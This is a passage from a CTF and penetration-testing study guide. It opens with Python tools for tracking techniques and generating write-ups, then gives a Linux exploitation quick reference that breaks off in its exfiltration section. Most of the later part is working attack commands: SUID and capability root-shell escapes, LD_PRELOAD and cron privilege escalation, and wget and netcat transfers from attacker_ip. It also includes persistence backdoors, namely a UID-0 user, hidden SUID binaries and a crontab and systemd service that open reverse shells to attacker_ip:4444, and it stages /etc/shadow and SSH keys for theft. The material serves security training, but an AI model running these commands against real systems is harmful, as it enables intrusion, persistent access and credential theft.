        if tool_name not in self.stats['tools']:
            self.stats['tools'][tool_name] = {
                'uses': 0,
                'effective': 0,
                'use_cases': []
            }
        
        tool = self.stats['tools'][tool_name]
        tool['uses'] += 1
        if effective:
            tool['effective'] += 1
        if use_case:
            tool['use_cases'].append(use_case)
        
        self.save_stats()
    
    def get_success_rate(self, technique_name):
        if technique_name in self.stats['techniques']:
            tech = self.stats['techniques'][technique_name]
            if tech['attempts'] > 0:
                return (tech['successes'] / tech['attempts']) * 100
        return 0
    
    def show_statistics(self):
        print("\n" + "="*70)
        print("TECHNIQUE EFFECTIVENESS REPORT")
        print("="*70)
        
        print("\n--- Top Successful Techniques ---")
        techniques = []
        for name, data in self.stats['techniques'].items():
            if data['attempts'] > 0:
                success_rate = (data['successes'] / data['attempts']) * 100
                avg_time = data['total_time'] / data['attempts']
                techniques.append({
                    'name': name,
                    'success_rate': success_rate,
                    'attempts': data['attempts'],
                    'avg_time': avg_time
                })
        
        techniques.sort(key=lambda x: x['success_rate'], reverse=True)
        
        for tech in techniques[:10]:
            print(f"\n{tech['name']}")
            print(f"  Success Rate: {tech['success_rate']:.1f}%")
            print(f"  Attempts: {tech['attempts']}")
            print(f"  Avg Time: {tech['avg_time']:.1f} minutes")
        
        print("\n--- Most Used Tools ---")
        tools = []
        for name, data in self.stats['tools'].items():
            if data['uses'] > 0:
                effectiveness = (data['effective'] / data['uses']) * 100
                tools.append({
                    'name': name,
                    'uses': data['uses'],
                    'effectiveness': effectiveness
                })
        
        tools.sort(key=lambda x: x['uses'], reverse=True)
        
        for tool in tools[:10]:
            print(f"\n{tool['name']}")
            print(f"  Uses: {tool['uses']}")
            print(f"  Effectiveness: {tool['effectiveness']:.1f}%")
        
        print("\n" + "="*70)

# Usage
tracker = TechniqueTracker()

# Record technique attempts
tracker.record_technique(
    "SQL Injection - Authentication Bypass",
    success=True,
    time_spent=15,
    notes="Used ' OR '1'='1'-- payload successfully"
)

tracker.record_technique(
    "PostgreSQL COPY PROGRAM RCE",
    success=True,
    time_spent=10,
    notes="Requires superuser privileges - always check first"
)

tracker.record_technique(
    "Kernel Exploitation",
    success=False,
    time_spent=45,
    notes="Wasted time - should have checked sudo first"
)

# Record tool usage
tracker.record_tool(
    "sqlmap",
    effective=True,
    use_case="Database enumeration and credential extraction"
)

tracker.record_tool(
    "LinPEAS",
    effective=True,
    use_case="Linux privilege escalation enumeration"
)

# Show statistics
tracker.show_statistics()
```

#### Post-CTF Review Checklist

```markdown
## Post-CTF Review Checklist

### Immediate (Within 1 hour of completion)

- [ ] Submit all flags
- [ ] Save all terminal output/logs
- [ ] Organize screenshots chronologically
- [ ] Note down exact commands that worked
- [ ] Document any custom scripts/tools created
- [ ] Record total time spent on machine

### Same Day

- [ ] Create basic write-up outline with:
  - [ ] Enumeration findings
  - [ ] Exploitation steps
  - [ ] Privilege escalation path
  - [ ] Flag locations
- [ ] Identify 3 key lessons learned
- [ ] Note any tools/techniques used for first time
- [ ] Record any mistakes or time wasted
- [ ] Compare approach with official hints (if available)

### Within 3 Days

- [ ] Complete full write-up
- [ ] Review other public write-ups for alternative methods
- [ ] Research any concepts that were unclear
- [ ] Add to personal knowledge base/wiki
- [ ] Update tool proficiency notes
- [ ] Practice similar techniques on other machines

### Weekly Review

- [ ] Revisit lessons learned
- [ ] Identify patterns across recent CTFs
- [ ] Update methodology based on new insights
- [ ] Review statistics (success rates, time management)
- [ ] Plan practice focus areas for next week
```

#### Knowledge Base Organization

```bash
#!/bin/bash
# Knowledge base directory structure

# Create organized knowledge base
mkdir -p ~/ctf_kb/{writeups,techniques,tools,cheatsheets,scripts,resources}

# Writeups organized by platform and difficulty
mkdir -p ~/ctf_kb/writeups/{htb,thm,ctftime}/{easy,medium,hard}

# Techniques organized by category
mkdir -p ~/ctf_kb/techniques/{enumeration,exploitation,privesc,persistence,exfiltration}

# Tools documentation
mkdir -p ~/ctf_kb/tools/{scanning,exploitation,post-exploitation,misc}

# Cheatsheets for quick reference
mkdir -p ~/ctf_kb/cheatsheets/{protocols,languages,platforms}

# Custom scripts organized by purpose
mkdir -p ~/ctf_kb/scripts/{enumeration,exploitation,automation}

# Resources and references
mkdir -p ~/ctf_kb/resources/{documentation,articles,videos}

# Create index file
cat > ~/ctf_kb/README.md << 'EOF'
# CTF Knowledge Base

## Directory Structure

- `writeups/` - Completed CTF write-ups organized by platform
- `techniques/` - Documented techniques and methodologies
- `tools/` - Tool documentation and usage guides
- `cheatsheets/` - Quick reference sheets
- `scripts/` - Custom automation and helper scripts
- `resources/` - External documentation and learning materials

## Quick Links

### Most Used Techniques
- [SQL Injection Techniques](techniques/exploitation/sql_injection.md)
- [Linux Privilege Escalation](techniques/privesc/linux_privesc.md)
- [PostgreSQL Exploitation](techniques/exploitation/postgresql.md)

### Essential Cheatsheets
- [Reverse Shell Cheatsheet](cheatsheets/reverse_shells.md)
- [Port Scanning Reference](cheatsheets/nmap.md)

### Statistics
- Total machines completed: XX
- Current success rate: XX%
- Favorite tools: sqlmap, linpeas, pspy
EOF

echo "[+] Knowledge base structure created at ~/ctf_kb"
```

#### Automated Documentation Generation

```python
#!/usr/bin/env python3
import os
import json
from datetime import datetime

class CTFDocGenerator:
    def __init__(self, ctf_name, category="misc"):
        self.ctf_name = ctf_name
        self.category = category
        self.data = {
            'metadata': {
                'name': ctf_name,
                'category': category,
                'date_started': datetime.now().isoformat(),
                'date_completed': None,
                'flags_found': []
            },
            'enumeration': [],
            'exploitation': [],
            'commands': [],
            'notes': [],
            'lessons': []
        }
    
    def log_command(self, command, output="", notes=""):
        entry = {
            'timestamp': datetime.now().isoformat(),
            'command': command,
            'output': output[:500] if len(output) > 500 else output,  # Truncate long output
            'notes': notes
        }
        self.data['commands'].append(entry)
    
    def add_finding(self, stage, finding, details=""):
        entry = {
            'timestamp': datetime.now().isoformat(),
            'finding': finding,
            'details': details
        }
        if stage == 'enumeration':
            self.data['enumeration'].append(entry)
        elif stage == 'exploitation':
            self.data['exploitation'].append(entry)
    
    def add_flag(self, flag_name, flag_value, location=""):
        flag = {
            'name': flag_name,
            'value': flag_value,
            'location': location,
            'timestamp': datetime.now().isoformat()
        }
        self.data['metadata']['flags_found'].append(flag)
    
    def add_note(self, note, tag="general"):
        entry = {
            'timestamp': datetime.now().isoformat(),
            'tag': tag,
            'content': note
        }
        self.data['notes'].append(entry)
    
    def add_lesson(self, lesson):
        entry = {
            'timestamp': datetime.now().isoformat(),
            'lesson': lesson
        }
        self.data['lessons'].append(entry)
    
    def mark_completed(self):
        self.data['metadata']['date_completed'] = datetime.now().isoformat()
    
    def generate_markdown_writeup(self):
        md = f"# {self.ctf_name} - CTF Documentation\n\n"
        
        # Metadata
        md += "## Metadata\n\n"
        md += f"- **Category:** {self.category}\n"
        md += f"- **Date Started:** {self.data['metadata']['date_started'][:10]}\n"
        if self.data['metadata']['date_completed']:
            md += f"- **Date Completed:** {self.data['metadata']['date_completed'][:10]}\n"
        md += f"- **Flags Found:** {len(self.data['metadata']['flags_found'])}\n\n"
        
        # Flags
        if self.data['metadata']['flags_found']:
            md += "## Flags Captured\n\n"
            for flag in self.data['metadata']['flags_found']:
                md += f"### {flag['name']}\n"
                md += f"- **Value:** `{flag['value']}`\n"
                md += f"- **Location:** {flag['location']}\n"
                md += f"- **Time:** {flag['timestamp'][:19]}\n\n"
        
        # Enumeration
        if self.data['enumeration']:
            md += "## Enumeration\n\n"
            for finding in self.data['enumeration']:
                md += f"### {finding['finding']}\n"
                md += f"{finding['details']}\n\n"
        
        # Exploitation
        if self.data['exploitation']:
            md += "## Exploitation\n\n"
            for exploit in self.data['exploitation']:
                md += f"### {exploit['finding']}\n"
                md += f"{exploit['details']}\n\n"
        
        # Key Commands
        if self.data['commands']:
            md += "## Key Commands\n\n"
            md += "```bash\n"
            for cmd in self.data['commands']:
                md += f"# {cmd['notes']}\n" if cmd['notes'] else ""
                md += f"{cmd['command']}\n\n"
            md += "```\n\n"
        
        # Notes
        if self.data['notes']:
            md += "## Notes\n\n"
            for note in self.data['notes']:
                md += f"- **[{note['tag']}]** {note['content']}\n"
            md += "\n"
        
        # Lessons Learned
        if self.data['lessons']:
            md += "## Lessons Learned\n\n"
            for i, lesson in enumerate(self.data['lessons'], 1):
                md += f"{i}. {lesson['lesson']}\n"
            md += "\n"
        
        return md
    
    def save_documentation(self, output_dir="./ctf_docs"):
        os.makedirs(output_dir, exist_ok=True)
        
        # Save JSON data
        json_file = os.path.join(output_dir, f"{self.ctf_name}_data.json")
        with open(json_file, 'w') as f:
            json.dump(self.data, f, indent=2)
        
        # Save markdown writeup
        md_file = os.path.join(output_dir, f"{self.ctf_name}_writeup.md")
        with open(md_file, 'w') as f:
            f.write(self.generate_markdown_writeup())
        
        print(f"[+] Documentation saved:")
        print(f"    JSON: {json_file}")
        print(f"    Markdown: {md_file}")

# Usage example
doc = CTFDocGenerator("PostgreSQL_Machine", category="Linux/Database")

# Log enumeration
doc.add_finding('enumeration', 'Port Scan Results', 
    'Found open ports: 22 (SSH), 80 (HTTP), 5432 (PostgreSQL)')
doc.log_command('nmap -sC -sV -oA nmap/initial 10.10.10.123')

# Log exploitation
doc.add_finding('exploitation', 'SQL Injection',
    'Login form vulnerable to basic SQL injection using \' OR \'1\'=\'1\'-- ')
doc.log_command('sqlmap -u "http://10.10.10.123/login" --data="user=admin&pass=test" --dump',
    notes='Extracted database credentials')

# Add flag
doc.add_flag('User Flag', 'HTB{us3r_fl4g_h3r3}', '/home/postgres/user.txt')

# Add notes
doc.add_note('PostgreSQL user has superuser privileges', tag='important')
doc.add_note('Used COPY PROGRAM for RCE', tag='exploitation')

# Add lessons
doc.add_lesson('Always check database user privileges immediately after access')
doc.add_lesson('COPY PROGRAM requires PostgreSQL 9.3+ and superuser rights')

# Mark as completed and save
doc.mark_completed()
doc.save_documentation()
```

#### Time Tracking Integration

```python
#!/usr/bin/env python3
import time
import json
from datetime import datetime, timedelta

class CTFTimer:
    def __init__(self, ctf_name, save_file='ctf_time_tracking.json'):
        self.ctf_name = ctf_name
        self.save_file = save_file
        self.sessions = self.load_sessions()
        self.current_session = None
    
    def load_sessions(self):
        try:
            with open(self.save_file, 'r') as f:
                data = json.load(f)
                return data.get(self.ctf_name, [])
        except FileNotFoundError:
            return []
    
    def save_sessions(self):
        try:
            with open(self.save_file, 'r') as f:
                data = json.load(f)
        except FileNotFoundError:
            data = {}
        
        data[self.ctf_name] = self.sessions
        
        with open(self.save_file, 'w') as f:
            json.dump(data, f, indent=2)
    
    def start_session(self, phase="general"):
        if self.current_session:
            print("[-] Session already running. Stop current session first.")
            return
        
        self.current_session = {
            'phase': phase,
            'start_time': datetime.now().isoformat(),
            'end_time': None,
            'duration': 0,
            'notes': []
        }
        print(f"[+] Timer started for phase: {phase}")
        print(f"[*] Start time: {datetime.now().strftime('%H:%M:%S')}")
    
    def stop_session(self, notes=""):
        if not self.current_session:
            print("[-] No active session to stop")
            return
        
        end_time = datetime.now()
        start_time = datetime.fromisoformat(self.current_session['start_time'])
        duration = (end_time - start_time).total_seconds() / 60  # minutes
        
        self.current_session['end_time'] = end_time.isoformat()
        self.current_session['duration'] = duration
        if notes:
            self.current_session['notes'].append(notes)
        
        self.sessions.append(self.current_session)
        self.save_sessions()
        
        print(f"[+] Session stopped")
        print(f"[*] Duration: {duration:.1f} minutes")
        print(f"[*] Phase: {self.current_session['phase']}")
        
        self.current_session = None
    
    def add_note(self, note):
        if self.current_session:
            self.current_session['notes'].append(note)
            print(f"[+] Note added to current session")
        else:
            print("[-] No active session")
    
    def get_total_time(self):
        return sum(session['duration'] for session in self.sessions)
    
    def get_phase_breakdown(self):
        phases = {}
        for session in self.sessions:
            phase = session['phase']
            phases[phase] = phases.get(phase, 0) + session['duration']
        return phases
    
    def show_report(self):
        print(f"\n{'='*60}")
        print(f"Time Report: {self.ctf_name}")
        print(f"{'='*60}")
        
        total = self.get_total_time()
        print(f"\nTotal Time: {total:.1f} minutes ({total/60:.1f} hours)")
        
        phases = self.get_phase_breakdown()
        print("\nTime by Phase:")
        for phase, duration in sorted(phases.items(), key=lambda x: x[1], reverse=True):
            percentage = (duration / total * 100) if total > 0 else 0
            print(f"  {phase:20s}: {duration:6.1f} min ({percentage:5.1f}%)")
        
        print(f"\nTotal Sessions: {len(self.sessions)}")
        
        if self.current_session:
            print("\n[!] Active session running")
            start_time = datetime.fromisoformat(self.current_session['start_time'])
            elapsed = (datetime.now() - start_time).total_seconds() / 60
            print(f"    Phase: {self.current_session['phase']}")
            print(f"    Elapsed: {elapsed:.1f} minutes")
        
        print(f"{'='*60}\n")

# Usage
timer = CTFTimer("PostgreSQL_Machine")

# Start enumeration phase
timer.start_session("enumeration")
# ... do enumeration work ...
time.sleep(2)  # Simulating work
timer.add_note("Found PostgreSQL on port 5432")
timer.stop_session("Completed initial reconnaissance")

# Start exploitation phase
timer.start_session("exploitation")
# ... do exploitation work ...
time.sleep(3)  # Simulating work
timer.add_note("SQL injection successful")
timer.stop_session("Obtained database access")

# Start privilege escalation
timer.start_session("privilege_escalation")
time.sleep(2)  # Simulating work
timer.stop_session("Got root access")

# Show report
timer.show_report()
```

#### Community Contribution Template

```markdown
## Community Write-up Submission Template

### For HackTheBox Forum Posts

**Thread Title:** [Machine Name] - [Your Approach/Unique Angle]

**Post Content:**

```

Hi everyone,

Just finished [Machine Name] and wanted to share my approach. [Brief unique aspect of your solution]

**Respect Spoiler Rules:**

- Do not post full solutions for active machines
- Use spoiler tags appropriately
- PM hints rather than posting publicly

**My Approach (Spoiler-Free Overview):**

1. Enumeration focused on [general area]
2. Found interesting [type of vulnerability]
3. Leveraged [general technique] for access
4. Used [general approach] for privilege escalation

**Hints for Those Stuck:**

- [Spoiler] Pay attention to [vague hint] [/Spoiler]
- [Spoiler] Don't overlook [general area to check] [/Spoiler]

**Lessons I learned:**

- [Technical lesson]
- [Methodology improvement]

Feel free to PM me if you want to discuss approaches!

````

### For Blog Posts

**Front Matter:**
```yaml
---
title: "CTF Write-up: [Machine Name]"
date: 2024-XX-XX
categories: [CTF, Write-ups]
tags: [relevant, tags, here]
author: Your Name
difficulty: Easy/Medium/Hard
platform: HackTheBox/TryHackMe/etc
retired: true/false  # Only post if machine is retired!
---
````

**Content Sections:**

1. Introduction & Machine Info
2. Initial Reconnaissance
3. Detailed Enumeration
4. Exploitation Walkthrough
5. Privilege Escalation
6. Alternative Methods (if applicable)
7. Remediation Recommendations
8. Lessons Learned
9. References

**Ethical Considerations:**

- ✅ Only publish after machine retirement
- ✅ Give credit to challenge creators
- ✅ Mention if solution was inspired by others
- ✅ Provide educational context
- ❌ Don't post active machine solutions
- ❌ Don't spoil challenges unnecessarily

```

---

**Related Critical Topics:**

- **Reporting and penetration testing documentation standards** - professional security assessment reporting
- **CTF competition strategies and team coordination** - optimizing performance in timed events
- **Building personal CTF automation frameworks** - creating reusable toolchains for efficiency
```

---

# [[ME Tools Mastery]]

---

# QUICK REFERENCE: OS-SPECIFIC EXPLOITATION FLOWS

## Linux Exploitation Flow

### Information Gathering

Information gathering forms the foundation of successful Linux exploitation. The objective is to build a complete understanding of the target system's configuration, running processes, user context, and potential attack vectors.

#### System Information Collection

**Kernel and OS Version Discovery**

```bash
uname -a                    # Complete system information
uname -r                    # Kernel release version
cat /etc/os-release         # Distribution details
cat /etc/issue              # Distribution identification
cat /proc/version           # Kernel version with compiler info
hostnamectl                 # System hostname and related info
```

The kernel version is critical for identifying kernel exploits. Different distributions compile kernels differently, affecting exploit compatibility.

**Current User Context**

```bash
id                          # User ID, group ID, and group memberships
whoami                      # Current username
groups                      # Groups the current user belongs to
last                        # Last logged in users
w                           # Currently logged in users
```

Group memberships often provide privilege escalation paths (docker, lxd, disk, video, adm groups).

**Sudo Configuration Analysis**

```bash
sudo -l                     # List allowed sudo commands for current user
sudo -l -U username         # List sudo privileges for specific user
cat /etc/sudoers            # Read sudoers file (requires privileges)
cat /etc/sudoers.d/*        # Additional sudo configurations
```

Common sudo misconfigurations include NOPASSWD entries, wildcards in command paths, and environment variable preservation.

**Process Enumeration**

```bash
ps aux                      # All running processes with details
ps -ef                      # Alternative process listing format
ps auxww                    # Full command lines without truncation
ps -eo pid,user,cmd         # Custom format process listing
pstree -p                   # Process tree with PIDs
top                         # Real-time process monitoring
htop                        # Interactive process viewer
```

Look for processes running as root, custom applications, databases, and web servers.

**Network Configuration**

```bash
ifconfig -a                 # Network interfaces (deprecated)
ip addr show                # Network interfaces (modern)
ip route show               # Routing table
netstat -antup              # All connections with programs
ss -antup                   # Socket statistics (modern alternative)
arp -a                      # ARP table
cat /etc/hosts              # Static hostname mappings
cat /etc/resolv.conf        # DNS configuration
```

**Environment Variables**

```bash
env                         # All environment variables
echo $PATH                  # Executable search path
echo $LD_PRELOAD            # Preloaded libraries
echo $LD_LIBRARY_PATH       # Library search paths
```

Environment variables can reveal credentials, configuration paths, and exploitation opportunities.

**File System Information**

```bash
df -h                       # Disk space and mounted filesystems
mount                       # All mounted filesystems
cat /etc/fstab              # Persistent mount configurations
lsblk                       # Block device information
findmnt                     # Mounted filesystem tree
```

Look for NFS shares, unusual mount options (nosuid, noexec bypasses), and shared filesystems.

**User and Group Enumeration**

```bash
cat /etc/passwd             # User account information
cat /etc/group              # Group definitions
cat /etc/shadow             # Password hashes (requires privileges)
getent passwd               # Query user database
getent group                # Query group database
```

**Scheduled Tasks**

```bash
crontab -l                  # Current user's cron jobs
cat /etc/crontab            # System crontab
ls -la /etc/cron.*          # Cron directories
cat /var/spool/cron/*       # User crontabs (requires privileges)
systemctl list-timers       # Systemd timers
```

**Service Enumeration**

```bash
systemctl list-units --type=service    # Systemd services
service --status-all                   # SysV init services
chkconfig --list                       # Service startup configuration
ls -la /etc/init.d/                    # Init scripts
```

### Vulnerability Identification

After gathering system information, identify potential vulnerabilities through automated tools, manual analysis, and public vulnerability databases.

#### Kernel Vulnerability Search

**SearchSploit Usage**

```bash
searchsploit linux kernel 4.15              # Search by kernel version
searchsploit -u                             # Update exploit database
searchsploit -m exploits/linux/local/12345  # Mirror exploit to current directory
searchsploit -x exploits/linux/local/12345  # Examine exploit code
searchsploit --exclude="dos"                # Exclude DoS exploits
searchsploit -t kernel privilege            # Title-only search
```

Match kernel version precisely. Ubuntu 4.15.0-99-generic differs from vanilla 4.15.0 kernels.

**Online Kernel Exploit Resources**

- Linux Exploit Suggester: Automated kernel vulnerability identification
- Kernel exploits often require exact kernel version matches and proper compilation

**Common Kernel Exploit Categories**

- Dirty COW (CVE-2016-5195): Copy-on-write race condition
- Dirty Pipe (CVE-2022-0847): File overwrite vulnerability
- PwnKit (CVE-2021-4034): Polkit privilege escalation
- Baron Samedit (CVE-2021-3156): Sudo heap overflow

#### SUID/SGID Binary Analysis

**Finding SUID/SGID Binaries**

```bash
find / -perm -4000 -type f 2>/dev/null      # SUID binaries
find / -perm -2000 -type f 2>/dev/null      # SGID binaries
find / -perm -6000 -type f 2>/dev/null      # Both SUID and SGID
find / -perm -u=s -type f 2>/dev/null       # Alternative SUID syntax
```

**GTFOBins Reference** GTFOBins (gtfobins.github.io) catalogs Unix binaries that can be exploited for privilege escalation, shell escape, or file operations when running with elevated privileges.

Common exploitable SUID binaries:

- `find`: Execute commands via `-exec`
- `vim/vi`: Shell escape with `:!/bin/sh`
- `nmap`: Interactive mode (older versions)
- `python/perl/ruby`: Direct shell access
- `cp`: Overwrite sensitive files
- `mv`: Move sensitive files
- `tar`: Arbitrary file read via checkpoint
- `zip/unzip`: File operations
- `base64/base32`: File read encoding

**Example SUID Exploitation**

```bash
# Find SUID binary
/usr/bin/find / -exec /bin/sh -p \; -quit

# Python SUID
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# Vim SUID
vim -c ':!/bin/sh'
```

The `-p` flag preserves effective UID when spawning shells from SUID binaries.

#### Linux Capabilities

**Capability Enumeration**

```bash
getcap -r / 2>/dev/null                     # Recursively find capabilities
capsh --print                               # Current process capabilities
getpcaps $(pgrep -f process_name)           # Capabilities of specific process
```

**Dangerous Capabilities**

- `CAP_SETUID`: Change user ID, direct root shell
- `CAP_SYS_ADMIN`: Mount filesystems, kernel operations
- `CAP_DAC_READ_SEARCH`: Bypass file read restrictions
- `CAP_DAC_OVERRIDE`: Bypass file write restrictions
- `CAP_CHOWN`: Change file ownership
- `CAP_FOWNER`: Bypass permission checks for file operations

**Capability Exploitation Examples**

```bash
# CAP_SETUID on Python
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# CAP_SETUID on Perl
/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'

# CAP_SYS_ADMIN exploitation (simplified)
# Allows mounting filesystems and container escapes
```

#### Writable File Analysis

**Finding Writable Files and Directories**

```bash
find / -writable -type d 2>/dev/null        # Writable directories
find / -writable -type f 2>/dev/null        # Writable files
find / -perm -222 -type f 2>/dev/null       # World-writable files
find /etc -writable 2>/dev/null             # Writable files in /etc
```

**Critical Writable Locations**

- `/etc/passwd`: Add root user
- `/etc/shadow`: Replace password hashes
- `/etc/sudoers`: Grant sudo privileges
- `/etc/ld.so.preload`: Library injection
- `/etc/cron.d/`: Create scheduled root tasks
- Service configuration files in `/etc/`
- Systemd unit files in `/etc/systemd/system/`

**PATH Exploitation**

```bash
echo $PATH                                  # Check current PATH
find / -writable -type d 2>/dev/null | grep -E '^/usr/local|^/opt'
# Look for writable directories in PATH
```

If a directory in PATH is writable and appears before standard directories, place malicious binaries there.

#### Configuration File Analysis

**Searching for Credentials**

```bash
grep -ri "password" /home 2>/dev/null
grep -ri "pass=" /var/www 2>/dev/null
find / -name "*.conf" -exec grep -l "password" {} \; 2>/dev/null
find / -name "*.config" -exec grep -l "password" {} \; 2>/dev/null
```

**Common Credential Locations**

- `~/.bash_history`: Command history with potential passwords
- `~/.mysql_history`: MySQL command history
- `~/.ssh/id_rsa`: SSH private keys
- `/var/www/html/config.php`: Web application database credentials
- `~/.aws/credentials`: AWS credentials
- `~/.docker/config.json`: Docker registry credentials

**Database Configuration Files**

```bash
cat /var/www/html/wp-config.php             # WordPress
cat /var/www/html/configuration.php         # Joomla
cat /var/www/html/sites/default/settings.php # Drupal
```

### Exploit Selection and Customization

After identifying vulnerabilities, select appropriate exploits and modify them for the target environment.

#### Exploit Evaluation Criteria

[Inference] When selecting exploits, consider:

1. **Version matching**: Kernel version and distribution must match exactly or closely
2. **Architecture compatibility**: x86, x86_64, ARM, etc.
3. **Exploit reliability**: Some exploits cause system instability
4. **Required dependencies**: Compiler versions, libraries
5. **Detection risk**: Stealth vs. noisy exploits

#### Exploit Compilation

**Basic Compilation**

```bash
gcc exploit.c -o exploit                    # Basic compilation
gcc -m32 exploit.c -o exploit               # 32-bit compilation
gcc -static exploit.c -o exploit            # Static linking
gcc -pthread exploit.c -o exploit           # Threading support
```

**Common Compilation Issues**

```bash
# Missing headers
apt-get install build-essential linux-headers-$(uname -r)

# Architecture mismatch
file exploit                                # Check binary architecture
uname -m                                    # Check system architecture
```

#### Exploit Transfer Methods

**HTTP Server**

```bash
# On attacker machine
python3 -m http.server 8000
python -m SimpleHTTPServer 8000             # Python 2

# On target
wget http://attacker_ip:8000/exploit
curl http://attacker_ip:8000/exploit -o exploit
```

**Netcat Transfer**

```bash
# On attacker machine
nc -lvnp 1234 < exploit

# On target
nc attacker_ip 1234 > exploit
```

**Base64 Encoding**

```bash
# On attacker machine
base64 exploit | xclip -selection clipboard

# On target
echo "BASE64_STRING" | base64 -d > exploit
```

**Script Inline Transfer**

```bash
# For scripts, copy directly into target terminal
cat << 'EOF' > exploit.sh
#!/bin/bash
# exploit code here
EOF
```

### Privilege Escalation Execution

Execute the selected exploit method to escalate privileges from low-privileged user to root.

#### Pre-Execution Checklist

1. Verify exploit compatibility with system version
2. Set proper permissions: `chmod +x exploit`
3. Identify writable temporary directory: `/tmp`, `/dev/shm`, `/var/tmp`
4. Check available disk space: `df -h`
5. Note current user context: `id`

#### SUID Binary Exploitation

**Standard SUID Shell**

```bash
# If binary has SUID and executes commands
/path/to/suid_binary
```

**Shell Escape Sequences**

```bash
# Vim/Vi
:!/bin/bash
:set shell=/bin/bash
:shell

# Less/More
!/bin/bash
v (enters vim, then use vim escape)

# Man
!/bin/bash

# Find
find . -exec /bin/bash -p \;

# AWK
awk 'BEGIN {system("/bin/bash -p")}'

# Python
python -c 'import os; os.system("/bin/bash -p")'
```

Always use `-p` flag with bash to preserve privileges in SUID context.

#### Sudo Exploitation

**NOPASSWD Exploitation**

```bash
# If sudo -l shows NOPASSWD entry
sudo /path/to/allowed_command

# Shell escape from allowed command (refer to GTFOBins)
```

**Sudo Environment Variables**

```bash
# Check for env_keep or env_reset bypass
sudo -l

# LD_PRELOAD exploitation
gcc -shared -fPIC -o /tmp/exploit.so exploit.c
sudo LD_PRELOAD=/tmp/exploit.so allowed_command
```

**Wildcard Exploitation**

```bash
# If sudoers contains wildcards like: user ALL=(ALL) /usr/bin/python *
sudo /usr/bin/python /dev/null -c 'import os; os.system("/bin/bash")'
```

#### Kernel Exploitation

**Dirty COW Example Flow**

```bash
# Transfer exploit
wget http://attacker/dirtycow.c
gcc -pthread dirtycow.c -o dirtycow -lcrypt

# Execute
./dirtycow

# Some variants require target file specification
./dirtycow /etc/passwd
```

[Unverified] Kernel exploits often cause system instability or crashes. Test in non-production environments when possible.

#### Capabilities Exploitation

**CAP_SETUID**

```bash
# Python with CAP_SETUID
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Perl with CAP_SETUID
/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```

**CAP_SYS_ADMIN Container Escape**

```bash
# Check if inside container
cat /proc/1/cgroup

# Mount host filesystem
mkdir /tmp/hostfs
mount /dev/sda1 /tmp/hostfs
chroot /tmp/hostfs
```

#### Cron Job Exploitation

**Writable Cron Script**

```bash
# If cron job runs writable script as root
echo '#!/bin/bash' > /path/to/cron_script.sh
echo 'cp /bin/bash /tmp/rootbash' >> /path/to/cron_script.sh
echo 'chmod +s /tmp/rootbash' >> /path/to/cron_script.sh
chmod +x /path/to/cron_script.sh

# Wait for cron execution
watch -n 1 ls -la /tmp/rootbash

# Execute root shell
/tmp/rootbash -p
```

**PATH Exploitation in Cron**

```bash
# If cron script uses relative paths
# Create malicious binary in writable PATH directory
cat << 'EOF' > /tmp/malicious_command
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
EOF
chmod +x /tmp/malicious_command

# Modify PATH or place binary where cron will find it
```

#### NFS Root Squashing Bypass

**No Root Squash Exploitation**

```bash
# On attacker machine (as root)
mkdir /tmp/nfs
mount -t nfs target_ip:/shared_folder /tmp/nfs
cd /tmp/nfs

# Create SUID shell
cp /bin/bash .
chmod +s bash

# On target machine
cd /shared_folder
./bash -p
```

This works when NFS export has `no_root_squash` option, allowing root on attacker machine to create root-owned SUID files.

### Persistence Installation

After gaining root access, establish persistence mechanisms to maintain access.

#### SSH Key Installation

**User SSH Directory**

```bash
mkdir -p /root/.ssh
chmod 700 /root/.ssh

# Generate key on attacker machine
ssh-keygen -t rsa -b 4096 -f ctf_key

# Add public key to target
echo "ssh-rsa AAAAB3NzaC1y..." >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
```

#### Backdoor User Creation

**Adding User to Passwd**

```bash
# Generate password hash
openssl passwd -1 -salt xyz password123

# Add user to /etc/passwd
echo 'backdoor:$1$xyz$HASH:0:0:root:/root:/bin/bash' >> /etc/passwd
```

The UID 0 grants root privileges.

#### SUID Backdoor

**Create Persistent SUID Binary**

```bash
cp /bin/bash /tmp/.hidden_shell
chmod +s /tmp/.hidden_shell

# Or create custom SUID binary
cat << 'EOF' > /tmp/backdoor.c
#include <unistd.h>
int main(void) {
    setuid(0);
    setgid(0);
    execl("/bin/bash", "bash", "-p", NULL);
}
EOF
gcc /tmp/backdoor.c -o /usr/local/bin/.backup
chmod +s /usr/local/bin/.backup
```

#### Cron Job Backdoor

**Reverse Shell Cron Job**

```bash
echo "*/5 * * * * root /bin/bash -c 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1'" >> /etc/crontab
```

This establishes reverse connection every 5 minutes.

#### Systemd Service Backdoor

**Create Persistent Service**

```bash
cat << 'EOF' > /etc/systemd/system/system-update.service
[Unit]
Description=System Update Service

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1'
Restart=always

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable system-update.service
systemctl start system-update.service
```

#### LD_PRELOAD Backdoor

**Library Injection**

```bash
cat << 'EOF' > /tmp/inject.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
EOF

gcc -shared -fPIC -o /usr/local/lib/inject.so /tmp/inject.c
echo "/usr/local/lib/inject.so" >> /etc/ld.so.preload
```

[Unverified] This may cause system instability if injected library affects critical processes.

### Data Exfiltration

Extract sensitive data from the compromised system.

#### Target Data Categories

**Credentials and Keys**

```bash
# Password hashes
cat /etc/shadow > /tmp/shadow.txt

# SSH keys
tar czf /tmp/ssh_keys.tar.gz /root/.ssh /home/*/.ssh

# Application credentials
find /var/www -name "*.conf" -o -name "*.config" -exec grep -l "password" {} \; | tar czf /tmp/app_creds.tar.gz -T -
```

**User Data**

```bash
# User home directories
tar czf /tmp/home_backup.tar.gz /home/*

# Browser data
find /home -name "*.sqlite" -path "*mozilla*" -o -path "*chrom*"
```

**System Configuration**

```bash
tar czf /tmp/etc_backup.tar.gz /etc
```

#### Exfiltration Methods

**HTTP POST**

```bash
# On attacker machine
